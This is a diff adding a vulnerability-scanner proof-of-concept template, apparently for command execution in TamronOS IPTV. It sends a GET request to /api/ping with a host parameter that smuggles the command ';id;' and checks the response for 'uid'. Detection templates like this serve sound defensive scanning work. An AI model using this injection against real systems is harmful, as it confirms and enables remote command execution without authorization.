@@ -1,0 +1,11 @@
+name: poc-yaml-TamronOS-IPTV-cmd
+description: >-
+  代码执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /api/ping?count=5&host=;id;
+    expression:
+      status: 200    
+      body_all: ["uid"]
